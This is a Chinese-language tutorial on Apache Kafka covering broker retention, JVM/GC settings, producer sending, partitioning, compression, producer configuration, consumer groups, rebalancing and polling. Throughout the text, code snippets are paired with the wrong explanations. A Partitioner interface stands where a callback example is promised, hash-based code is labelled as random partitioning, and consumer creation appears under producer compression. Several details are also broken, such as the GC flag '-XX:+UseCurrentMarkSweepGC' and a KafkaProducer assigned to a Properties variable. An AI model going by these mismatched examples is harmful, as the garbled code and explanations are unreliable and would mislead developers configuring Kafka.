另一种保留消息的方式是判断消息是否过期。它的值通过参数 log.retention.bytes 来指定，作用在每一个分区上。也就是说，如果有一个包含 8 个分区的主题，并且 log.retention.bytes 被设置为 1GB，那么这个主题最多可以保留 8GB 数据。所以，当主题的分区个数增加时，整个主题可以保留的数据也随之增加。

log.segment.bytes

上述的日志都是作用在日志片段上，而不是作用在单个消息上。当消息到达 broker 时，它们被追加到分区的当前日志片段上，当日志片段大小到达 log.segment.bytes 指定上限（默认为 1GB）时，当前日志片段就会被关闭，一个新的日志片段被打开。如果一个日志片段被关闭，就开始等待过期。这个参数的值越小，就越会频繁的关闭和分配新文件，从而降低磁盘写入的整体效率。

log.segment.ms

上面提到日志片段经关闭后需等待过期，那么 log.segment.ms 这个参数就是指定日志多长时间被关闭的参数和，log.segment.ms 和 log.retention.bytes 也不存在互斥问题。日志片段会在大小或时间到达上限时被关闭，就看哪个条件先得到满足。

message.max.bytes

broker 通过设置 message.max.bytes 参数来限制单个消息的大小，默认是 1000 000， 也就是 1MB，如果生产者尝试发送的消息超过这个大小，不仅消息不会被接收，还会收到 broker 返回的错误消息。跟其他与字节相关的配置参数一样，该参数指的是压缩后的消息大小，也就是说，只要压缩后的消息小于 mesage.max.bytes，那么消息的实际大小可以大于这个值
这个值对性能有显著的影响。值越大，那么负责处理网络连接和请求的线程就需要花越多的时间来处理这些请求。它还会增加磁盘写入块的大小，从而影响 IO 吞吐量。

retention.ms

规定了该主题消息被保存的时常，默认是 7 天，即该主题只能保存 7 天的消息，一旦设置了这个值，它会覆盖掉 Broker 端的全局参数值。

retention.bytes

retention.bytes：规定了要为该 Topic 预留多大的磁盘空间。和全局参数作用相似，这个值通常在多租户的 Kafka 集群中会有用武之地。当前默认值是 -1，表示可以无限使用磁盘空间。
JVM 参数配置JDK 版本一般推荐直接使用 JDK1.8，这个版本也是现在中国大部分程序员的首选版本。
说到 JVM 端设置，就绕不开堆这个话题，业界最推崇的一种设置方式就是直接将 JVM 堆大小设置为 6GB，这样会避免很多 Bug 出现。
JVM 端配置的另一个重要参数就是垃圾回收器的设置，也就是平时常说的 GC 设置。如果你依然在使用 Java 7，那么可以根据以下法则选择合适的垃圾回收器：

如果 Broker 所在机器的 CPU 资源非常充裕，建议使用 CMS 收集器。启用方法是指定 - XX:+UseCurrentMarkSweepGC。

否则，使用吞吐量收集器。开启方法是指定 - XX:+UseParallelGC。


当然了，如果你已经在使用 Java 8 了，那么就用默认的 G1 收集器就好了。在没有任何调优的情况下，G1 表现得要比 CMS 出色，主要体现在更少的 Full GC，需要调整的参数更少等，所以使用 G1 就好了。
一般 G1 的调整只需要这两个参数即可

MaxGCPauseMillis

该参数指定每次垃圾回收默认的停顿时间。该值不是固定的，G1 可以根据需要使用更长的时间。它的默认值是 200ms，也就是说，每一轮垃圾回收大概需要 200 ms 的时间；

InitiatingHeapOccupancyPercent

该参数指定了 G1 启动新一轮垃圾回收之前可以使用的堆内存百分比，默认值是 45，这就表明 G1 在堆使用率到达 45 之前不会启用垃圾回收。这个百分比包括新生代和老年代。
Kafka Producer在 Kafka 中，我们把产生消息的那一方称为生产者，比如我们经常回去淘宝购物，你打开淘宝的那一刻，你的登陆信息，登陆次数都会作为消息传输到 Kafka 后台，当你浏览购物的时候，你的浏览信息，你的搜索指数，你的购物爱好都会作为一个个消息传递给 Kafka 后台，然后淘宝会根据你的爱好做智能推荐，致使你的钱包从来都禁不住诱惑，那么这些生产者产生的消息是怎么传到 Kafka 应用程序的呢？发送过程是怎么样的呢？
尽管消息的产生非常简单，但是消息的发送过程还是比较复杂的，如图

我们从创建一个 ProducerRecord 对象开始，ProducerRecord 是 Kafka 中的一个核心类，它代表了一组 Kafka 需要发送的 key/value 键值对，它由记录要发送到的主题名称（Topic Name），可选的分区号（Partition Number）以及可选的键值对构成。
在发送 ProducerRecord 时，我们需要将键值对对象由序列化器转换为字节数组，这样它们才能够在网络上传输。然后消息到达了分区器。
如果发送过程中指定了有效的分区号，那么在发送记录时将使用该分区。如果发送过程中未指定分区，则将使用 key 的 hash 函数映射指定一个分区。如果发送的过程中既没有分区号也没有，则将以循环的方式分配一个分区。选好分区后，生产者就知道向哪个主题和分区发送数据了。
ProducerRecord 还有关联的时间戳，如果用户没有提供时间戳，那么生产者将会在记录中使用当前的时间作为时间戳。Kafka 最终使用的时间戳取决于 topic 主题配置的时间戳类型。

如果将主题配置为使用 CreateTime，则生产者记录中的时间戳将由 broker 使用。
如果将主题配置为使用 LogAppendTime，则生产者记录中的时间戳在将消息添加到其日志中时，将由 broker 重写。

然后，这条消息被存放在一个记录批次里，这个批次里的所有消息会被发送到相同的主题和分区上。由一个独立的线程负责把它们发到 Kafka Broker 上。
Kafka Broker 在收到消息时会返回一个响应，如果写入成功，会返回一个 RecordMetaData 对象，它包含了主题和分区信息，以及记录在分区里的偏移量，上面两种的时间戳类型也会返回给用户。如果写入失败，会返回一个错误。生产者在收到错误之后会尝试重新发送消息，几次之后如果还是失败的话，就返回错误消息。
创建 Kafka 生产者要向 Kafka 写入消息，首先需要创建一个生产者对象，并设置一些属性。Kafka 生产者有 3 个必选的属性

bootstrap.servers

该属性指定 broker 的地址清单，地址的格式为 host:port。清单里不需要包含所有的 broker 地址，生产者会从给定的 broker 里查找到其他的 broker 信息。不过建议至少要提供两个 broker 信息，一旦其中一个宕机，生产者仍然能够连接到集群上。

key.serializer

broker 需要接收到序列化之后的 key/value 值，所以生产者发送的消息需要经过序列化之后才传递给 Kafka Broker。生产者需要知道采用何种方式把 Java 对象转换为字节数组。key.serializer 必须被设置为一个实现了 org.apache.kafka.common.serialization.Serializer 接口的类，生产者会使用这个类把键对象序列化为字节数组。这里拓展一下 Serializer 类
Serializer 是一个接口，它表示类将会采用何种方式序列化，它的作用是把对象转换为字节，实现了 Serializer 接口的类主要有 ByteArraySerializer、StringSerializer、IntegerSerializer ，其中 ByteArraySerialize 是 Kafka 默认使用的序列化器，其他的序列化器还有很多，你可以通过 这里 查看其他序列化器。要注意的一点：key.serializer 是必须要设置的，即使你打算只发送值的内容。

value.serializer

与 key.serializer 一样，value.serializer 指定的类会将值序列化。
下面代码演示了如何创建一个 Kafka 生产者，这里只指定了必要的属性，其他使用默认的配置
private Properties properties &#x3D; new Properties();
properties.put(&quot;bootstrap.servers&quot;,&quot;broker1:9092,broker2:9092&quot;);
properties.put(&quot;key.serializer&quot;,&quot;org.apache.kafka.common.serialization.StringSerializer&quot;);
properties.put(&quot;value.serializer&quot;,&quot;org.apache.kafka.common.serialization.StringSerializer&quot;);
properties &#x3D; new KafkaProducer&lt;String,String&gt;(properties);

来解释一下这段代码

首先创建了一个 Properties 对象；
使用 StringSerializer 序列化器序列化 key / value 键值对；
在这里我们创建了一个新的生产者对象，并为键值设置了恰当的类型，然后把 Properties 对象传递给他。

Kafka 消息发送实例化生产者对象后，接下来就可以开始发送消息了，发送消息主要由下面几种方式
简单消息发送Kafka 最简单的消息发送如下：
ProducerRecord&lt;String,String&gt; record &#x3D;
                new ProducerRecord&lt;String, String&gt;(&quot;CustomerCountry&quot;,&quot;West&quot;,&quot;France&quot;);
producer.send(record);

代码中生产者 (producer) 的 send() 方法需要把 ProducerRecord 的对象作为参数进行发送，ProducerRecord 有很多构造函数，这个我们下面讨论，这里调用的是
ProducerRecord&lt;String,String&gt; record &#x3D;
                new ProducerRecord&lt;String, String&gt;(&quot;CustomerCountry&quot;,&quot;West&quot;,&quot;France&quot;);
try&#123;
  RecordMetadata recordMetadata &#x3D; producer.send(record).get();
&#125;catch(Exception e)&#123;
  e.printStackTrace()；
&#125;

这个构造函数，需要传递的是 topic 主题，key 和 value。
把对应的参数传递完成后，生产者调用send()方法发送消息（ProducerRecord 对象）。我们可以从生产者的架构图中看出，消息是先被写入分区中的缓冲区中，然后分批次发送给 Kafka Broker。

发送成功后，send() 方法会返回一个 Future(java.util.concurrent) 对象，Future 对象的类型是 RecordMetadata 类型，我们上面这段代码没有考虑返回值，所以没有生成对应的 Future 对象，所以没有办法知道消息是否发送成功。如果不是很重要的信息或者对结果不会产生影响的信息，可以使用这种方式进行发送。
我们可以忽略发送消息时可能发生的错误或者在服务器端可能发生的错误，但在消息发送之前，生产者还可能发生其他的异常。这些异常有可能是 SerializationException(序列化失败)，BufferedExhaustedException 或 TimeoutException(说明缓冲区已满)，又或是 InterruptedException(说明发送线程被中断)
同步发送消息第二种消息发送机制如下所示
ProducerRecord&lt;String, String&gt; producerRecord &#x3D; new ProducerRecord&lt;String, String&gt;(&quot;CustomerCountry&quot;, &quot;Huston&quot;, &quot;America&quot;);
        producer.send(producerRecord,new DemoProducerCallBack());

class DemoProducerCallBack implements Callback &#123;
  public void onCompletion(RecordMetadata metadata, Exception exception) &#123;
    if(exception !&#x3D; null)&#123;
      exception.printStackTrace();;
    &#125;
  &#125;
&#125;

这种发送消息的方式较上面的发送方式有了改进，首先调用send()方法，然后再调用get()方法等待 Kafka 响应。如果服务器返回错误，get() 方法会抛出异常，如果没有发生错误，我们会得到 RecordMetadata 对象，可以用它来查看消息记录。
生产者（KafkaProducer）在发送的过程中会出现两类错误：其中一类是重试错误，这类错误可以通过重发消息来解决。比如连接的错误，可以通过再次建立连接来解决；无主错误则可以通过重新为分区选举首领来解决。KafkaProducer 被配置为自动重试，如果多次重试后仍无法解决问题，则会抛出重试异常。另一类错误是无法通过重试来解决的，比如消息过大对于这类错误，KafkaProducer 不会进行重试，直接抛出异常。
异步发送消息同步发送消息都有个问题，那就是同一时间只能有一个消息在发送，这会造成许多消息无法直接发送，造成消息滞后，无法发挥效益最大化。
比如消息在应用程序和 Kafka 集群之间一个来回需要 10ms。如果发送完每个消息后都等待响应的话，那么发送 100 个消息需要 1 秒，但是如果是异步方式的话，发送 100 条消息所需要的时间就会少很多很多。大多数时候，虽然 Kafka 会返回 RecordMetadata 消息，但是我们并不需要等待响应。
为了在异步发送消息的同时能够对异常情况进行处理，生产者提供了回掉支持。下面是回调的一个例子
public interface Partitioner extends Configurable, Closeable &#123;

  public int partition(String topic, Object key, byte[] keyBytes, Object value, byte[] valueBytes, Cluster cluster);

  public void close();

  default public void onNewBatch(String topic, Cluster cluster, int prevPartition) &#123;&#125;
&#125;

首先实现回调需要定义一个实现了 org.apache.kafka.clients.producer.Callback 的类，这个接口只有一个 onCompletion 方法。如果 kafka 返回一个错误，onCompletion 方法会抛出一个非空 (non null) 异常，这里我们只是简单的把它打印出来，如果是生产环境需要更详细的处理，然后在send()方法发送的时候传递一个 Callback 回调的对象。
生产者分区机制Kafka 对于数据的读写是以分区为粒度的，分区可以分布在多个主机（Broker）中，这样每个节点能够实现独立的数据写入和读取，并且能够通过增加新的节点来增加 Kafka 集群的吞吐量，通过分区部署在多个 Broker 来实现负载均衡的效果。
上面我们介绍了生产者的发送方式有三种：不管结果如何直接发送、发送并返回结果、发送并回调。由于消息是存在主题（topic）的分区（partition）中的，所以当 Producer 生产者发送产生一条消息发给 topic 的时候，你如何判断这条消息会存在哪个分区中呢？
这其实就设计到 Kafka 的分区机制了。
分区策略
Kafka 的分区策略指的就是将生产者发送到哪个分区的算法。Kafka 为我们提供了默认的分区策略，同时它也支持你自定义分区策略。
如果要自定义分区策略的话，你需要显示配置生产者端的参数 Partitioner.class，我们可以看一下这个类它位于 org.apache.kafka.clients.producer 包下
List&lt;PartitionInfo&gt; partitions &#x3D; cluster.partitionsForTopic(topic);
return ThreadLocalRandom.current().nextInt(partitions.size());

Partitioner 类有三个方法，分别来解释一下

partition(): 这个类有几个参数: topic，表示需要传递的主题；key 表示消息中的键值；keyBytes 表示分区中序列化过后的 key，byte 数组的形式传递；value 表示消息的 value 值；valueBytes 表示分区中序列化后的值数组；cluster 表示当前集群的原数据。Kafka 给你这么多信息，就是希望让你能够充分地利用这些信息对消息进行分区，计算出它要被发送到哪个分区中。
close(): 继承了 Closeable 接口能够实现close()方法，在分区关闭时调用。
onNewBatch(): 表示通知分区程序用来创建新的批次

其中与分区策略息息相关的就是partition()方法了，分区策略有下面这几种
顺序轮询
顺序分配，消息是均匀的分配给每个 partition，即每个分区存储一次消息。就像下面这样

上图表示的就是轮询策略，轮训策略是 Kafka Producer 提供的默认策略，如果你不使用指定的轮训策略的话，Kafka 默认会使用顺序轮训策略的方式。
随机轮询
随机轮询简而言之就是随机的向 partition 中保存消息，如下图所示

实现随机分配的代码只需要两行，如下
List&lt;PartitionInfo&gt; partitions &#x3D; cluster.partitionsForTopic(topic);
return Math.abs(key.hashCode()) % partitions.size();

先计算出该主题总的分区数，然后随机地返回一个小于它的正整数。
本质上看随机策略也是力求将数据均匀地打散到各个分区，但从实际表现来看，它要逊于轮询策略，所以如果追求数据的均匀分布，还是使用轮询策略比较好。事实上，随机策略是老版本生产者使用的分区策略，在新版本中已经改为轮询了。
按照 key 进行消息保存
这个策略也叫做 key-ordering 策略，Kafka 中每条消息都会有自己的 key，一旦消息被定义了 Key，那么你就可以保证同一个 Key 的所有消息都进入到相同的分区里面，由于每个分区下的消息处理都是有顺序的，故这个策略被称为按消息键保序策略，如下图所示

实现这个策略的 partition 方法同样简单，只需要下面两行代码即可：
private Properties properties &#x3D; new Properties();
properties.put(&quot;bootstrap.servers&quot;,&quot;192.168.1.9:9092&quot;);
properties.put(&quot;key.serializer&quot;,&quot;org.apache.kafka.common.serialization.StringSerializer&quot;);
properties.put(&quot;value.serializer&quot;,&quot;org.apache.kafka.common.serialization.StringSerializer&quot;);
properties.put(&quot;compression.type&quot;, &quot;gzip&quot;);

Producer&lt;String,String&gt; producer &#x3D; new KafkaProducer&lt;String, String&gt;(properties);

ProducerRecord&lt;String,String&gt; record &#x3D;
  new ProducerRecord&lt;String, String&gt;(&quot;CustomerCountry&quot;,&quot;Precision Products&quot;,&quot;France&quot;);

上面这几种分区策略都是比较基础的策略，除此之外，你还可以自定义分区策略。
生产者压缩机制压缩一词简单来讲就是一种互换思想，它是一种经典的用 CPU 时间去换磁盘空间或者 I/O 传输量的思想，希望以较小的 CPU 开销带来更少的磁盘占用或更少的网络 I/O 传输。如果你还不了解的话我希望你先读完这篇文章 程序员需要了解的硬核知识之压缩算法，然后你就明白压缩是怎么回事了。
Kafka 压缩是什么
Kafka 的消息分为两层：消息集合 和 消息。一个消息集合中包含若干条日志项，而日志项才是真正封装消息的地方。Kafka 底层的消息日志由一系列消息集合日志项组成。Kafka 通常不会直接操作具体的一条条消息，它总是在消息集合这个层面上进行写入操作。
在 Kafka 中，压缩会发生在两个地方：Kafka Producer 和 Kafka Consumer，为什么启用压缩？说白了就是消息太大，需要变小一点 来使消息发的更快一些。
Kafka Producer 中使用 compression.type 来开启压缩
Properties properties &#x3D; new Properties();
properties.put(&quot;bootstrap.server&quot;,&quot;192.168.1.9:9092&quot;);
properties.put(&quot;key.serializer&quot;,&quot;org.apache.kafka.common.serialization.StringSerializer&quot;);
properties.put(&quot;value.serializer&quot;,&quot;org.apache.kafka.common.serialization.StringSerializer&quot;);
KafkaConsumer&lt;String,String&gt; consumer &#x3D; new KafkaConsumer&lt;&gt;(properties);

上面代码表明该 Producer 的压缩算法使用的是 GZIP
有压缩必有解压缩，Producer 使用压缩算法压缩消息后并发送给服务器后，由 Consumer 消费者进行解压缩，因为采用的何种压缩算法是随着 key、value 一起发送过去的，所以消费者知道采用何种压缩算法。
Kafka 重要参数配置在上一篇文章 带你涨姿势的认识一下 kafka 中，我们主要介绍了一下 kafka 集群搭建的参数，本篇文章我们来介绍一下 Kafka 生产者重要的配置，生产者有很多可配置的参数，在文档里（http://kafka.apache.org/documentation/#producerconfigs）都有说明，我们介绍几个在内存使用、性能和可靠性方面对生产者影响比较大的参数进行说明
key.serializer
用于 key 键的序列化，它实现了 org.apache.kafka.common.serialization.Serializer 接口
value.serializer
用于 value 值的序列化，实现了 org.apache.kafka.common.serialization.Serializer 接口
acks
acks 参数指定了要有多少个分区副本接收消息，生产者才认为消息是写入成功的。此参数对消息丢失的影响较大

如果 acks = 0，就表示生产者也不知道自己产生的消息是否被服务器接收了，它才知道它写成功了。如果发送的途中产生了错误，生产者也不知道，它也比较懵逼，因为没有返回任何消息。这就类似于 UDP 的运输层协议，只管发，服务器接受不接受它也不关心；

如果 acks = 1，只要集群的 Leader 接收到消息，就会给生产者返回一条消息，告诉它写入成功。如果发送途中造成了网络异常或者 Leader 还没选举出来等其他情况导致消息写入失败，生产者会受到错误消息，这时候生产者往往会再次重发数据。因为消息的发送也分为 同步 和 异步，Kafka 为了保证消息的高效传输会决定是同步发送还是异步发送。如果让客户端等待服务器的响应（通过调用 Future 中的 get() 方法），显然会增加延迟，如果客户端使用回调，就会解决这个问题；

如果 acks = all，这种情况下是只有当所有参与复制的节点都收到消息时，生产者才会接收到一个来自服务器的消息。不过，它的延迟比 acks =1 时更高，因为我们要等待不只一个服务器节点接收消息。


buffer.memory
此参数用来设置生产者内存缓冲区的大小，生产者用它缓冲要发送到服务器的消息。如果应用程序发送消息的速度超过发送到服务器的速度，会导致生产者空间不足。这个时候，send() 方法调用要么被阻塞，要么抛出异常，具体取决于 block.on.buffer.null 参数的设置。
compression.type
此参数来表示生产者启用何种压缩算法，默认情况下，消息发送时不会被压缩。该参数可以设置为 snappy、gzip 和 lz4，它指定了消息发送给 broker 之前使用哪一种压缩算法进行压缩。下面是各压缩算法的对比


retries
生产者从服务器收到的错误有可能是临时性的错误（比如分区找不到首领），在这种情况下，reteis 参数的值决定了生产者可以重发的消息次数，如果达到这个次数，生产者会放弃重试并返回错误。默认情况下，生产者在每次重试之间等待 100ms，这个等待参数可以通过 retry.backoff.ms 进行修改。
batch.size
当有多个消息需要被发送到同一个分区时，生产者会把它们放在同一个批次里。该参数指定了一个批次可以使用的内存大小，按照字节数计算。当批次被填满，批次里的所有消息会被发送出去。不过生产者井不一定都会等到批次被填满才发送，任意条数的消息都可能被发送。
client.id
此参数可以是任意的字符串，服务器会用它来识别消息的来源，一般配置在日志里
max.in.flight.requests.per.connection
此参数指定了生产者在收到服务器响应之前可以发送多少消息，它的值越高，就会占用越多的内存，不过也会提高吞吐量。把它设为 1 可以保证消息是按照发送的顺序写入服务器。
timeout.ms、request.timeout.ms 和 metadata.fetch.timeout.ms
request.timeout.ms 指定了生产者在发送数据时等待服务器返回的响应时间，metadata.fetch.timeout.ms 指定了生产者在获取元数据（比如目标分区的首领是谁）时等待服务器返回响应的时间。如果等待时间超时，生产者要么重试发送数据，要么返回一个错误。timeout.ms 指定了 broker 等待同步副本返回消息确认的时间，与 asks 的配置相匹配 ---- 如果在指定时间内没有收到同步副本的确认，那么 broker 就会返回一个错误。
max.block.ms
此参数指定了在调用send()方法或使用partitionFor()方法获取元数据时生产者的阻塞时间当生产者的发送缓冲区已捕，或者没有可用的元数据时，这些方法就会阻塞。在阻塞时间达到 max.block.ms 时，生产者会抛出超时异常。
max.request.size
该参数用于控制生产者发送的请求大小。它可以指能发送的单个消息的最大值，也可以指单个请求里所有消息的总大小。
receive.buffer.bytes 和 send.buffer.bytes
Kafka 是基于 TCP 实现的，为了保证可靠的消息传输，这两个参数分别指定了 TCP Socket 接收和发送数据包的缓冲区的大小。如果它们被设置为 -1，就使用操作系统的默认值。如果生产者或消费者与 broker 处于不同的数据中心，那么可以适当增大这些值。
Kafka Consumer应用程序使用 KafkaConsumer 从 Kafka 中订阅主题并接收来自这些主题的消息，然后再把他们保存起来。应用程序首先需要创建一个 KafkaConsumer 对象，订阅主题并开始接受消息，验证消息并保存结果。一段时间后，生产者往主题写入的速度超过了应用程序验证数据的速度，这时候该如何处理？如果只使用单个消费者的话，应用程序会跟不上消息生成的速度，就像多个生产者像相同的主题写入消息一样，这时候就需要多个消费者共同参与消费主题中的消息，对消息进行分流处理。
Kafka 消费者从属于消费者群组。一个群组中的消费者订阅的都是相同的主题，每个消费者接收主题一部分分区的消息。下面是一个 Kafka 分区消费示意图

上图中的主题 T1 有四个分区，分别是分区 0、分区 1、分区 2、分区 3，我们创建一个消费者群组 1，消费者群组中只有一个消费者，它订阅主题 T1，接收到 T1 中的全部消息。由于一个消费者处理四个生产者发送到分区的消息，压力有些大，需要帮手来帮忙分担任务，于是就演变为下图

这样一来，消费者的消费能力就大大提高了，但是在某些环境下比如用户产生消息特别多的时候，生产者产生的消息仍旧让消费者吃不消，那就继续增加消费者。

如上图所示，每个分区所产生的消息能够被每个消费者群组中的消费者消费，如果向消费者群组中增加更多的消费者，那么多余的消费者将会闲置，如下图所示

向群组中增加消费者是横向伸缩消费能力的主要方式。总而言之，我们可以通过增加消费组的消费者来进行水平扩展提升消费能力。这也是为什么建议创建主题时使用比较多的分区数，这样可以在消费负载高的情况下增加消费者来提升性能。另外，消费者的数量不应该比分区数多，因为多出来的消费者是空闲的，没有任何帮助。
Kafka 一个很重要的特性就是，只需写入一次消息，可以支持任意多的应用读取这个消息。换句话说，每个应用都可以读到全量的消息。为了使得每个应用都能读到全量消息，应用需要有不同的消费组。对于上面的例子，假如我们新增了一个新的消费组 G2，而这个消费组有两个消费者，那么就演变为下图这样

在这个场景中，消费组 G1 和消费组 G2 都能收到 T1 主题的全量消息，在逻辑意义上来说它们属于不同的应用。
总结起来就是如果应用需要读取全量消息，那么请为该应用设置一个消费组；如果该应用消费能力不足，那么可以考虑在这个消费组里增加消费者。
消费者组和分区重平衡消费者组是什么
消费者组（Consumer Group）是由一个或多个消费者实例（Consumer Instance）组成的群组，具有可扩展性和可容错性的一种机制。消费者组内的消费者共享一个消费者组 ID，这个 ID 也叫做 Group ID，组内的消费者共同对一个主题进行订阅和消费，同一个组中的消费者只能消费一个分区的消息，多余的消费者会闲置，派不上用场。
我们在上面提到了两种消费方式

一个消费者群组消费一个主题中的消息，这种消费模式又称为点对点的消费方式，点对点的消费方式又被称为消息队列；
一个主题中的消息被多个消费者群组共同消费，这种消费模式又称为发布 - 订阅模式。

消费者重平衡
我们从上面的消费者演变图中可以知道这么一个过程：最初是一个消费者订阅一个主题并消费其全部分区的消息，后来有一个消费者加入群组，随后又有更多的消费者加入群组，而新加入的消费者实例分摊了最初消费者的部分消息，这种把分区的所有权通过一个消费者转到其他消费者的行为称为重平衡，英文名也叫做 Rebalance 。如下图所示

重平衡非常重要，它为消费者群组带来了高可用性 和 伸缩性，我们可以放心的添加消费者或移除消费者，不过在正常情况下我们并不希望发生这样的行为。在重平衡期间，消费者无法读取消息，造成整个消费者组在重平衡的期间都不可用。另外，当分区被重新分配给另一个消费者时，消息当前的读取状态会丢失，它有可能还需要去刷新缓存，在它重新恢复状态之前会拖慢应用程序。
消费者通过向组织协调者（Kafka Broker）发送心跳来维护自己是消费者组的一员并确认其拥有的分区。对于不同不的消费群体来说，其组织协调者可以是不同的。只要消费者定期发送心跳，就会认为消费者是存活的并处理其分区中的消息。当消费者检索记录或者提交它所消费的记录时就会发送心跳。
如果过了一段时间 Kafka 停止发送心跳了，会话（Session）就会过期，组织协调者就会认为这个 Consumer 已经死亡，就会触发一次重平衡。如果消费者宕机并且停止发送消息，组织协调者会等待几秒钟，确认它死亡了才会触发重平衡。在这段时间里，死亡的消费者将不处理任何消息。在清理消费者时，消费者将通知协调者它要离开群组，组织协调者会触发一次重平衡，尽量降低处理停顿。
重平衡是一把双刃剑，它为消费者群组带来高可用性和伸缩性的同时，还有有一些明显的缺点 (bug)，而这些 bug 到现在社区还无法修改。
重平衡的过程对消费者组有极大的影响。因为每次重平衡过程中都会导致万物静止，参考 JVM 中的垃圾回收机制，也就是 Stop The World ，STW，(引用自《深入理解 Java 虚拟机》中 p76 关于 Serial 收集器的描述)：

更重要的是它在进行垃圾收集时，必须暂停其他所有的工作线程。直到它收集结束。Stop The World 这个名字听起来很帅，但这项工作实际上是由虚拟机在后台自动发起并完成的，在用户不可见的情况下把用户正常工作的线程全部停掉，这对很多应用来说都是难以接受的。

也就是说，在重平衡期间，消费者组中的消费者实例都会停止消费，等待重平衡的完成。而且重平衡这个过程很慢......
创建消费者上面的理论说的有点多，下面就通过代码来讲解一下消费者是如何消费的
在读取消息之前，需要先创建一个 KafkaConsumer 对象。创建 KafkaConsumer 对象与创建 KafkaProducer 对象十分相似 --- 把需要传递给消费者的属性放在 properties 对象中，后面我们会着重讨论 Kafka 的一些配置，这里我们先简单的创建一下，使用 3 个属性就足矣，分别是 bootstrap.server，key.deserializer，value.deserializer 。
这三个属性我们已经用过很多次了，如果你还不是很清楚的话，可以参考 带你涨姿势是认识一下 Kafka Producer
还有一个属性是 group.id 这个属性不是必须的，它指定了 KafkaConsumer 是属于哪个消费者群组。创建不属于任何一个群组的消费者也是可以的
try &#123;
  while (true) &#123;
    ConsumerRecords&lt;String, String&gt; records &#x3D; consumer.poll(Duration.ofSeconds(100));
    for (ConsumerRecord&lt;String, String&gt; record : records) &#123;
      int updateCount &#x3D; 1;
      if (map.containsKey(record.value())) &#123;
        updateCount &#x3D; (int) map.get(record.value() + 1);
      &#125;
      map.put(record.value(), updateCount);
    &#125;
  &#125;
&#125;finally &#123;
  consumer.close();
&#125;

主题订阅
创建好消费者之后，下一步就开始订阅主题了。subscribe() 方法接受一个主题列表作为参数，使用起来比较简单
consumer.subscribe(Collections.singletonList(&quot;customerTopic&quot;));

为了简单我们只订阅了一个主题 customerTopic，参数传入的是一个正则表达式，正则表达式可以匹配多个主题，如果有人创建了新的主题，并且主题的名字与正则表达式相匹配，那么会立即触发一次重平衡，消费者就可以读取新的主题。
要订阅所有与 test 相关的主题，可以这样做
consumer.subscribe(&quot;test.*&quot;);

轮询
我们知道，Kafka 是支持订阅 / 发布模式的，生产者发送数据给 Kafka Broker，那么消费者是如何知道生产者发送了数据呢？其实生产者产生的数据消费者是不知道的，KafkaConsumer 采用轮询的方式定期去 Kafka Broker 中进行数据的检索，如果有数据就用来消费，如果没有就再继续轮询等待，下面是轮询等待的具体实现
try &#123;
  while (true) &#123;
    ConsumerRecords&lt;String, String&gt; records &#x3D; consumer.poll(Duration.ofSeconds(100));
    for (ConsumerRecord&lt;String, String&gt; record : records) &#123;
      int updateCount &#x3D; 1;
      if (map.containsKey(record.value())) &#123;
        updateCount &#x3D; (int) map.get(record.value() + 1);
      &#125;
      map.put(record.value(), updateCount);
    &#125;
  &#125;
&#125;finally &#123;
  consumer.close();
&#125;


这是一个无限循环。消费者实际上是一个长期运行的应用程序，它通过轮询的方式向 Kafka 请求数据；

第三行代码非常重要，Kafka 必须定期循环请求数据，否则就会认为该 Consumer 已经挂了，会触发重平衡，它的分区会移交给群组中的其它消费者。传给 poll() 方法的是一个超市时间，用 java.time.Duration 类来表示，如果该参数被设置为 0 ，poll() 方法会立刻返回，否则就会在指定的毫秒数内一直等待 broker 返回数据；


*poll()方法会返回一个记录列表。每条记录都包含了记录所属主题的信息，记录所在分区的信息、记录在分区中的偏移量，以及记录的键值对。我们一般会遍历这个列表，逐条处理每条记录；

在退出应用程序之前使用 close() 方法关闭消费者。网络连接和 socket 也会随之关闭，并立即触发一次重平衡，而不是等待群组协调器发现它不再发送心跳并认定它已经死亡。


线程安全性
在同一个群组中，我们无法让一个线程运行多个消费者，也无法让多个线程安全的共享一个消费者。按照规则，一个消费者使用一个线程，如果一个消费者群组中多个消费者都想要运行的话，那么必须让每个消费者在自己的线程中运行，可以使用 Java 中的 ExecutorService 启动多个消费者进行进行处理。

消费者配置到目前为止，我们学习了如何使用消费者 API，不过只介绍了几个最基本的属性，Kafka 文档列出了所有与消费者相关的配置说明。大部分参数都有合理的默认值，一般不需要修改它们，下面我们就来介绍一下这些参数。

fetch.min.bytes

该属性指定了消费者从服务器获取记录的最小字节数。broker 在收到消费者的数据请求时，如果可用的数据量小于 fetch.min.bytes 指定的大小，那么它会等到有足够的可用数据时才把它返回给消费者。这样可以降低消费者和 broker 的工作负载，因为它们在主题使用频率不是很高的时候就不用来回处理消息。如果没有很多可用数据，但消费者的 CPU 使用率很高，那么就需要把该属性的值设得比默认值大。如果消费者的数量比较多，把该属性的值调大可以降低 broker 的工作负载。

fetch.max.wait.ms

我们通过上面的 fetch.min.bytes 告诉 Kafka，等到有足够的数据时才会把它返回给消费者。而 fetch.max.wait.ms 则用于指定 broker 的等待时间，默认是 500 毫秒。如果没有足够的数据流入 kafka 的话，消费者获取的最小数据量要求就得不到满足，最终导致 500 毫秒的延迟。如果要降低潜在的延迟，就可以把参数值设置的小一些。如果 fetch.max.wait.ms 被设置为 100 毫秒的延迟，而 fetch.min.bytes 的值设置为 1MB，那么 Kafka 在收到消费者请求后，要么返回 1MB 的数据，要么在 100 ms 后返回所有可用的数据。就看哪个条件首先被满足。

max.partition.fetch.bytes

该属性指定了服务器从每个分区里返回给消费者的最大字节数。它的默认值时 1MB，也就是说，KafkaConsumer.poll() 方法从每个分区里返回的记录最多不超过 max.partition.fetch.bytes 指定的字节。如果一个主题有 20 个分区和 5 个消费者，那么每个消费者需要至少 4 MB 的可用内存来接收记录。在为消费者分配内存时，可以给它们多分配一些，因为如果群组里有消费者发生崩溃，剩下的消费者需要处理更多的分区。max.partition.fetch.bytes 的值必须比 broker 能够接收的最大消息的字节数 (通过 max.message.size 属性配置大)，否则消费者可能无法读取这些消息，导致消费者一直挂起重试。在设置该属性时，另外一个考量的因素是消费者处理数据的时间。消费者需要频繁的调用poll()方法来避免会话过期和发生分区再平衡，如果单次调用poll()返回的数据太多，消费者需要更多的时间进行处理，可能无法及时进行下一个轮询来避免会话过期。如果出现这种情况，可以把 max.partition.fetch.bytes 值改小，或者延长会话过期时间。

session.timeout.ms

